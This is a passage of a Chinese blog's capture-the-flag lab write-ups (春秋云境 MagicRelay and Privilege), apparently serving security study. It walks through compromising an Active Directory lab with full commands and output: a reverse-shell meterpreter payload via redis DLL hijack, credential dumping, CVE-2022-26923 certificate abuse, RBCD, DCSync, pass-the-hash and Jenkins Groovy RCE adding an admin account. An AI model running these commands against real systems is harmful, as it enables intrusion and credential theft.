SeMachineAccountPrivilege</p>\n</li>\n</ul>\n<p>具体利用参看：<a href=\"https://trya9ain.github.io/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4\">noPac MAQ = 0 的突破</a></p>\n<hr>\n<p>原理分析文章：</p>\n<p><a href=\"https://killer.wtf/2021/12/24/Analyse-NoPac.html\">解析CVE-2021-42278和CVE-2021-42287</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA\">从XP源码泄露看nopac漏洞</a></p>\n<p><a href=\"https://antipassion.github.io/2022/03/01/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/\">CVE-2021-42287/CVE-2021-42278分析复现</a></p>\n<p><a href=\"https://trya9ain.github.io/posts/nopac-%E5%88%86%E6%9E%90/\">noPac 分析</a></p>\n","categories":["内网渗透"]},{"title":"春秋云境-MagicRelay","url":"/2025/05/25/MagicRelay/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/0b83b2ee7a7ea57e67ba88c9327a3c60.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、  CVE-2022-26923 ADCS 权限提升：</p>\n<p><a href=\"https://mp.weixin.qq.com/s/FR9VYJAnPJX4L4KYSD55bA\">CVE-2022-26923 AD域提权漏洞深入分析</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/C3It3HI1bpjc5p4O9lJ4Cg\">Active Directory 域服务特权提升漏洞 CVE-2022–26923</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/3DZPkG4Z9w8xbVKvW64Mgw\">cve-2022-26923漏洞复现+踩坑记录</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/335471.html\">Windows域提权漏洞CVE-2022-26923分析与复现</a></p>\n<p>机器账户申请证书时，CA 将从 AD 中请求者用户对象的dNSHostName属性获得的值添加到已颁发证书的主题备用名称中进行识别，dNSHostName属性在AD中不要求唯一，所以可以通过修改成与任意DC相同的dNSHostName来达到欺骗ADCS的效果，从而生成DC的机器证书，实现域内提权。</p>\n<p>二、Pass the Certificate（Schannel）</p>\n<ul>\n<li><p>PKINIT 是 Kerberos 协议的一个标准扩展，允许用户用 <strong>同时包含私钥和公钥证书的打包文件(.pfx)</strong> 代替密码完成初始认证来获取 TGT</p>\n</li>\n<li><p>Schannel 是 Windows 实现的一个 TLS/SSL 协议栈，它负责实现 TLS 握手、加密通信和证书验证。它提供了一整套 API，应用程序（比如 Kerberos 客户端或服务端）通过调用 Schannel 来完成 TLS 连接中的加密和证书相关操作</p>\n</li>\n</ul>\n<p>即 <strong>Schannel 是 Windows 底层的 TLS/证书验证实现，PKINIT 的实现会用到它来完成证书的处理和安全通信。</strong></p>\n<p>当某些域控制器不支持 PKINIT时，通常是因为域控制器所使用的证书中，缺少了用于智能卡登录的 EKU（ Smart Card Logon EKU），往往会返回一个错误代码：<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>，表示不支持请求中的预认证数据类型，此时可以使用 Schannel 继续进行认证</p>\n<p><a href=\"https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html\">Authenticating with certificates when PKINIT is not supported</a></p>\n<p><a href=\"https://github.com/AlmondOffSec/PassTheCert/\">https://github.com/AlmondOffSec/PassTheCert/</a></p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.12.25</th>\n<th>WIN-YUYAOX9Q.xiaorang.lab</th>\n<th>redis</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.12.6</td>\n<td>WIN-SERVER.xiaorang.lab</td>\n<td>DC域控</td>\n</tr>\n<tr>\n<td>172.22.12.31</td>\n<td>WORKGROUP\\WIN-IISQE3PC</td>\n<td>IIS网站 ftp匿名 向日葵rce</td>\n</tr>\n<tr>\n<td>172.22.12.12</td>\n<td>WIN-AUTHORITY.xiaorang.lab</td>\n<td>CA服务器</td>\n</tr>\n</tbody></table>\n<h1 id=\"redis-dll-劫持\"><a href=\"#redis-dll-劫持\" class=\"headerlink\" title=\"redis dll 劫持\"></a>redis dll 劫持</h1><p>redis劫持dll上线：<a href=\"https://github.com/P4r4d1se/dll_hijack\">https://github.com/P4r4d1se/dll_hijack</a>   、 <a href=\"https://github.com/0671/RabR\">https://github.com/0671/RabR</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xxx LPORT&#x3D;4444 -f c</span><br><span class=\"line\">python3 redis-attack.py -r 39.99.159.129 -L xxx -wf dbghelp.dll</span><br></pre></td></tr></table></figure>\n\n<p>抓hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; getuid</span><br><span class=\"line\">Server username: WIN-YUYAOX9Q\\Administrator</span><br><span class=\"line\"></span><br><span class=\"line\">meterpreter &gt; cat Administrator&#x2F;flag&#x2F;flag01.txt</span><br><span class=\"line\"> ________ ___       ________  ________  ________    _____     </span><br><span class=\"line\">|\\  _____\\\\  \\     |\\   __  \\|\\   ____\\|\\   __  \\  &#x2F; __  \\    </span><br><span class=\"line\">\\ \\  \\__&#x2F;\\ \\  \\    \\ \\  \\|\\  \\ \\  \\___|\\ \\  \\|\\  \\|\\&#x2F;_|\\  \\   </span><br><span class=\"line\"> \\ \\   __\\\\ \\  \\    \\ \\   __  \\ \\  \\  __\\ \\  \\\\\\  \\|&#x2F; \\ \\  \\  </span><br><span class=\"line\">  \\ \\  \\_| \\ \\  \\____\\ \\  \\ \\  \\ \\  \\|\\  \\ \\  \\\\\\  \\   \\ \\  \\ </span><br><span class=\"line\">   \\ \\__\\   \\ \\_______\\ \\__\\ \\__\\ \\_______\\ \\_______\\   \\ \\__\\</span><br><span class=\"line\">    \\|__|    \\|_______|\\|__|\\|__|\\|_______|\\|_______|    \\|__|</span><br><span class=\"line\"></span><br><span class=\"line\">flag01: flag&#123;58455a83-7516-4a8f-92bf-ca94e7aa33a0&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">meterpreter &gt; getsystem</span><br><span class=\"line\">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class=\"line\">meterpreter &gt; getuid</span><br><span class=\"line\">Server username: NT AUTHORITY\\SYSTEM</span><br><span class=\"line\">meterpreter &gt; hashdump</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:abf1bda66923f85bba8a99d43f18c846:::</span><br><span class=\"line\">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cb7414c1c58bd89074b0ee9c5f0e78e7:::</span><br><span class=\"line\">Xunyu:1000:aad3b435b51404eeaad3b435b51404ee:91111a7007fdcbcbff8972ab2f30b83d:::</span><br><span class=\"line\">meterpreter &gt; creds_all</span><br><span class=\"line\">[+] Running as SYSTEM</span><br><span class=\"line\">[*] Retrieving all credentials</span><br><span class=\"line\">msv credentials</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">Username       Domain        NTLM                              SHA1</span><br><span class=\"line\">--------       ------        ----                              ----</span><br><span class=\"line\">Administrator  WIN-YUYAOX9Q  abf1bda66923f85bba8a99d43f18c846  bbff6286fb932f6d5f4bba1351cee28d4a21108e</span><br><span class=\"line\">WIN-YUYAOX9Q$  XIAORANG      e611213c6a712f9b18a8d056005a4f0f  1a8d2c95320592037c0fa583c1f62212d4ff8ce9</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"向日葵RCE\"><a href=\"#向日葵RCE\" class=\"headerlink\" title=\"向日葵RCE\"></a>向日葵RCE</h1><p>172.22.12.31开启ftp，发现有向日葵，工具：<a href=\"https://github.com/Mr-xn/sunlogin_rce\">https://github.com/Mr-xn/sunlogin_rce</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xrkRce.exe -h 172.22.12.31  -t scan -p 30000-50000</span><br><span class=\"line\">xrkRce.exe -h 172.22.12.31  -t rce -p 49687 -c &quot;type C:\\Users\\Administrator\\flag\\flag02.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525220434976.png\" alt=\"image-20250525220434976\"></p>\n<h1 id=\"CVE-2022-26923\"><a href=\"#CVE-2022-26923\" class=\"headerlink\" title=\"CVE-2022-26923\"></a>CVE-2022-26923</h1><p>redis机器提权到system做域内信息收集，因为域内有CA，重点关注利用ADCS这一块的漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Public\\Downloads&gt;Certify.exe find &#x2F;vulnerable</span><br><span class=\"line\">Certify.exe find &#x2F;vulnerable</span><br><span class=\"line\"></span><br><span class=\"line\">   _____          _   _  __              </span><br><span class=\"line\">  &#x2F; ____|        | | (_)&#x2F; _|             </span><br><span class=\"line\"> | |     ___ _ __| |_ _| |_ _   _        </span><br><span class=\"line\"> | |    &#x2F; _ \\ &#39;__| __| |  _| | | |      </span><br><span class=\"line\"> | |___|  __&#x2F; |  | |_| | | | |_| |       </span><br><span class=\"line\">  \\_____\\___|_|   \\__|_|_|  \\__, |   </span><br><span class=\"line\">                             __&#x2F; |       </span><br><span class=\"line\">                            |___.&#x2F;        </span><br><span class=\"line\">  v1.1.0                               </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: Find certificate templates</span><br><span class=\"line\">[*] Using the search base &#39;CN&#x3D;Configuration,DC&#x3D;xiaorang,DC&#x3D;lab&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Listing info about the Enterprise CA &#39;xiaorang-WIN-AUTHORITY-CA&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">    Enterprise CA Name            : xiaorang-WIN-AUTHORITY-CA</span><br><span class=\"line\">    DNS Hostname                  : WIN-AUTHORITY.xiaorang.lab</span><br><span class=\"line\">    FullName                      : WIN-AUTHORITY.xiaorang.lab\\xiaorang-WIN-AUTHORITY-CA</span><br><span class=\"line\">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class=\"line\">    Cert SubjectName              : CN&#x3D;xiaorang-WIN-AUTHORITY-CA, DC&#x3D;xiaorang, DC&#x3D;lab</span><br><span class=\"line\">    Cert Thumbprint               : 10944A7D8B6C6CBC7EE267DD6DBF3C0624FE7F08</span><br><span class=\"line\">    Cert Serial                   : 2E92B9E129A646B84641219EFBDB1EB3</span><br><span class=\"line\">    Cert Start Date               : 2022&#x2F;10&#x2F;29 10:50:19</span><br><span class=\"line\">    Cert End Date                 : 2027&#x2F;10&#x2F;29 11:00:19</span><br><span class=\"line\">    Cert Chain                    : CN&#x3D;xiaorang-WIN-AUTHORITY-CA,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">    UserSpecifiedSAN              : Disabled</span><br><span class=\"line\">    CA Permissions                :</span><br><span class=\"line\">      Owner: BUILTIN\\Administrators        S-1-5-32-544</span><br><span class=\"line\"></span><br><span class=\"line\">      Access Rights                                     Principal</span><br><span class=\"line\"></span><br><span class=\"line\">      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               XIAORANG\\Domain Admins        S-1-5-21-3745972894-1678056601-2622918667-512</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               XIAORANG\\Enterprise Admins    S-1-5-21-3745972894-1678056601-2622918667-519</span><br><span class=\"line\">    Enrollment Agent Restrictions : None</span><br><span class=\"line\"></span><br><span class=\"line\">[+] No Vulnerable Certificates Templates found!</span><br><span class=\"line\"></span><br><span class=\"line\">Certify completed in 00:00:00.7878454</span><br></pre></td></tr></table></figure>\n\n<p>并无常规ESC可利用，尝试利用 CVE-2022-26923</p>\n<p>添加账号成功，说明存在CVE-2022-26923</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user evil -pass Qwer1234 -dns WIN-SERVER.xiaorang.lab -debug</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222255199.png\" alt=\"image-20250525222255199\"></p>\n<p>配置hosts</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.22.12.6 WIN-SERVER.xiaorang.lab</span><br><span class=\"line\">172.22.12.12 WIN-AUTHORITY.xiaorang.lab</span><br><span class=\"line\">172.22.12.12 xiaorang-WIN-AUTHORITY-CA</span><br></pre></td></tr></table></figure>\n\n<p>请求证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad req -u &#39;evil$@xiaorang.lab&#39; -p Qwer1234 -ca &#39;xiaorang-WIN-AUTHORITY-CA&#39; -target 172.22.12.12 -template Machine -dc-ip 172.22.12.6 -debug</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222338223.png\" alt=\"image-20250525222338223\"></p>\n<p>认证证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222429807.png\" alt=\"image-20250525222429807\"></p>\n<p>报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code></p>\n<h1 id=\"PTC（RBCD）\"><a href=\"#PTC（RBCD）\" class=\"headerlink\" title=\"PTC（RBCD）\"></a>PTC（RBCD）</h1><p>由于不支持PKINIT，尝试利用Schannel协议进行Pass The Cert，提取密钥与证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad cert -pfx win-server.pfx -nokey -out win-server.crt</span><br><span class=\"line\">certipy-ad cert -pfx win-server.pfx -nocert -out win-server.key </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222609945.png\" alt=\"image-20250525222609945\"></p>\n<p>利用证书进行认证后，配置域控的RBCD到一开始创建的新用户上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-from &#39;evil$&#39; -delegate-to &#39;win-server$&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222809036.png\" alt=\"image-20250525222809036\"></p>\n<p>PTT</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-getST xiaorang.lab&#x2F;&#39;evil$&#39;:Qwer1234 -spn cifs&#x2F;win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6</span><br><span class=\"line\">export KRB5CCNAME&#x3D;Administrator@cifs_win-server.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class=\"line\">impacket-wmiexec WIN-SERVER.xiaorang.lab -no-pass -k -dc-ip 172.22.12.6</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222924076.png\" alt=\"image-20250525222924076\"></p>\n<p>Dcsync dump hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump WIN-SERVER.xiaorang.lab -no-pass -k -dc-ip 172.22.12.6 -just-dc-ntlm -user-status</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525223656907.png\" alt=\"image-20250525223656907\"></p>\n<p>PTH</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-wmiexec xiaorang.lab&#x2F;Administrator@WIN-AUTHORITY -hashes :aa95e708a5182931157a526acf769b13</span><br></pre></td></tr></table></figure>\n\n","categories":["云境靶场"]},{"title":"春秋云境-Privilege","url":"/2025/05/02/Privilege/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/9245b95eab3fbc58ade91bd31fbb7ff0.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、Jenkins  后台 rce</p>\n<p>jenkins管理员明文密码存放在 <code>$JENKINS_HOME/secrets/initialAdminPassword</code> 中，后台可以执行groovy脚本</p>\n<p>二、Gitlab V4 API使用</p>\n<p>通过api去操作gitlab，手册：<a href=\"https://docs.gitlab.com/ee/api/projects.html\">https://docs.gitlab.com/ee/api/projects.html</a> ，API列出所有项目</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl --header &quot;PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2&quot; &quot;http:&#x2F;&#x2F;172.22.14.16&#x2F;api&#x2F;v4&#x2F;projects&quot;</span><br></pre></td></tr></table></figure>\n\n<p>三、odat</p>\n<p>ODAT （Oracle Database Attacking Tool），专门用于远程测试 Oracle 数据库安全性，wiki：</p>\n<p><a href=\"https://github.com/quentinhardy/odat/wiki\">https://github.com/quentinhardy/odat/wiki</a></p>\n<p>四、特权滥用提权</p>\n<p>五、kerberoasting</p>\n<p><a href=\"https://hypnoticp.github.io/CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html\">Kerberoasting 攻击</a> 、<a href=\"https://xz.aliyun.com/t/13697?time__1311=GqmxuD9DgiYeqGNDQi5BKTI7reEpEbD#toc-20\">深入理解 Kerberoasting 攻击</a> 、<a href=\"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting\">域渗透——Kerberoasting</a></p>\n<p>六、SPN的发现与利用</p>\n<p><a href=\"https://xz.aliyun.com/t/12998\">SPN注册发现与利用方法</a></p>\n<p>七、卷影拷贝</p>\n<p><a href=\"https://xz.aliyun.com/t/13369?time__1311=GqmxuiDQD=iti=D/briQGkQKG=MM6OGwfbD#toc-5\">域内用户Hash获取方式总结</a> 、<a href=\"https://xz.aliyun.com/t/9624?time__1311=n4+xnD0DuDRDgBWGkQD/ia+mxjr4f2Br+eDvQx#toc-12\">利用卷影拷贝服务提取ntds.dit</a> 、<a href=\"https://www.freebuf.com/articles/network/251267.html\">内网渗透测试：从NTDS.dit获取域散列值</a></p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.14.7</th>\n<th>XR-JENKINS</th>\n<th>WordPress 服务（80 端口）、jenkins 服务（8080 端口）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.14.16</td>\n<td>gitlab.xiaorang.lab</td>\n<td>gitlab 服务器</td>\n</tr>\n<tr>\n<td>172.22.14.31</td>\n<td>XR-ORACLE</td>\n<td>oracle 数据库服务器</td>\n</tr>\n<tr>\n<td>172.22.14.46</td>\n<td>XR-0923.xiaorang.lab</td>\n<td>内网 PC 机</td>\n</tr>\n<tr>\n<td>172.22.14.11</td>\n<td>XR-DC.xiaorang.lab</td>\n<td>域控</td>\n</tr>\n</tbody></table>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><blockquote>\n<p>请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\\ProgramData\\Jenkins.jenkins。</p>\n</blockquote>\n<p>80: wordpress</p>\n<p>8080: Jenkins</p>\n<p>端口扫描 -&gt; 源码泄露 -&gt; 代审 -&gt; 任意文件读取</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">39.100.181.19:139 open</span><br><span class=\"line\">39.100.181.19:445 open</span><br><span class=\"line\">39.100.181.19:3306 open</span><br><span class=\"line\">39.100.181.19:3389 open</span><br><span class=\"line\">39.100.181.19:80 open</span><br><span class=\"line\">39.100.181.19:8080 open</span><br><span class=\"line\">39.100.181.19:135 open</span><br><span class=\"line\">[*] alive ports len is: 6</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]39.100.181.19</span><br><span class=\"line\">   [-&gt;]XR-JENKINS</span><br><span class=\"line\">   [-&gt;]172.22.14.7</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;39.100.181.19:8080 code:403 len:548    title:None</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;39.100.181.19      code:200 len:54689  title:XR SHOP</span><br><span class=\"line\">[+] PocScan http:&#x2F;&#x2F;39.100.181.19&#x2F;www.zip poc-yaml-backup-file</span><br></pre></td></tr></table></figure>\n\n<p>Jenkins明文密码存储在：<code>$JENKINS_HOME\\secrets\\initialAdminPassword</code></p>\n<p>利用任意文件读密码：510235cf43f14e83b88a9f144199655b</p>\n<p>登陆后访问/script/，命令执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">println &quot;whoami&quot;.execute().text</span><br><span class=\"line\">net user hack Ab@123 &#x2F;add</span><br><span class=\"line\">net localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208231113375.png\" alt=\"image-20241208231113375\"></p>\n<p>RDP：C:\\Users\\Administrator\\flag\\flag.txt</p>\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><blockquote>\n<p>管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\hack&gt;ipconfig</span><br><span class=\"line\"></span><br><span class=\"line\">Windows IP 配置</span><br><span class=\"line\"></span><br><span class=\"line\">以太网适配器 以太网:</span><br><span class=\"line\"></span><br><span class=\"line\">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class=\"line\">   本地链接 IPv6 地址. . . . . . . . : fe80::9a7c:69f8:3ec4:cc0%3</span><br><span class=\"line\">   IPv4 地址 . . . . . . . . . . . . : 172.22.14.7</span><br><span class=\"line\">   子网掩码  . . . . . . . . . . . . : 255.255.0.0</span><br><span class=\"line\">   默认网关. . . . . . . . . . . . . : 172.22.255.253</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\hack&gt;net user</span><br><span class=\"line\"></span><br><span class=\"line\">\\\\XR-JENKINS 的用户帐户</span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">Administrator            DefaultAccount           Guest</span><br><span class=\"line\">hack                     WDAGUtilityAccount</span><br><span class=\"line\">命令成功完成。</span><br></pre></td></tr></table></figure>\n\n<p>翻文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208232138731.png\" alt=\"image-20241208232138731\"></p>\n<p>GitLab API token</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm&#x2F;GEobmrmLYh&#125;</span><br></pre></td></tr></table></figure>\n\n<p>该token为加密，需要控制台解密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">println(hudson.util.Secret.fromString(&quot;&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm&#x2F;GEobmrmLYh&#125;&quot;).getPlainText())</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208232316833.png\" alt=\"image-20241208232316833\"></p>\n<p>GitLab API token:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">glpat-7kD_qLH2PiQv_ywB9hz2</span><br></pre></td></tr></table></figure>\n\n<p>fscan</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">start infoscan</span><br><span class=\"line\">(icmp) Target 172.22.14.7     is alive</span><br><span class=\"line\">(icmp) Target 172.22.14.11    is alive</span><br><span class=\"line\">(icmp) Target 172.22.14.16    is alive</span><br><span class=\"line\">(icmp) Target 172.22.14.31    is alive</span><br><span class=\"line\">(icmp) Target 172.22.14.46    is alive</span><br><span class=\"line\">[*] Icmp alive hosts len is: 5</span><br><span class=\"line\">172.22.14.46:80 open</span><br><span class=\"line\">172.22.14.16:80 open</span><br><span class=\"line\">172.22.14.7:80 open</span><br><span class=\"line\">172.22.14.16:22 open</span><br><span class=\"line\">172.22.14.7:8080 open</span><br><span class=\"line\">172.22.14.7:3306 open</span><br><span class=\"line\">172.22.14.31:1521 open</span><br><span class=\"line\">172.22.14.46:445 open</span><br><span class=\"line\">172.22.14.31:445 open</span><br><span class=\"line\">172.22.14.11:445 open</span><br><span class=\"line\">172.22.14.7:445 open</span><br><span class=\"line\">172.22.14.31:139 open</span><br><span class=\"line\">172.22.14.46:139 open</span><br><span class=\"line\">172.22.14.11:139 open</span><br><span class=\"line\">172.22.14.31:135 open</span><br><span class=\"line\">172.22.14.46:135 open</span><br><span class=\"line\">172.22.14.7:139 open</span><br><span class=\"line\">172.22.14.11:135 open</span><br><span class=\"line\">172.22.14.7:135 open</span><br><span class=\"line\">172.22.14.11:88 open</span><br><span class=\"line\">172.22.14.16:8060 open</span><br><span class=\"line\">172.22.14.16:9094 open</span><br><span class=\"line\">[*] alive ports len is: 22</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.22.14.7</span><br><span class=\"line\">   [-&gt;]XR-JENKINS</span><br><span class=\"line\">   [-&gt;]172.22.14.7</span><br><span class=\"line\">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\\XR-DC</span><br><span class=\"line\">[*] NetBios 172.22.14.31    WORKGROUP\\XR-ORACLE</span><br><span class=\"line\">[*] NetBios 172.22.14.46    XIAORANG\\XR-0923</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.14.7:8080   code:403 len:548    title:None</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.22.14.11</span><br><span class=\"line\">   [-&gt;]XR-DC</span><br><span class=\"line\">   [-&gt;]172.22.14.11</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.22.14.31</span><br><span class=\"line\">   [-&gt;]XR-ORACLE</span><br><span class=\"line\">   [-&gt;]172.22.14.31</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.22.14.46</span><br><span class=\"line\">   [-&gt;]XR-0923</span><br><span class=\"line\">   [-&gt;]172.22.14.46</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.14.16       code:302 len:99     title:None 跳转url: http:&#x2F;&#x2F;172.22.14.16&#x2F;users&#x2F;sign_in</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.14.16&#x2F;users&#x2F;sign_in code:200 len:34961  title:Sign in · GitLab</span><br><span class=\"line\">已完成 22&#x2F;22</span><br><span class=\"line\">[*] 扫描结束,耗时: 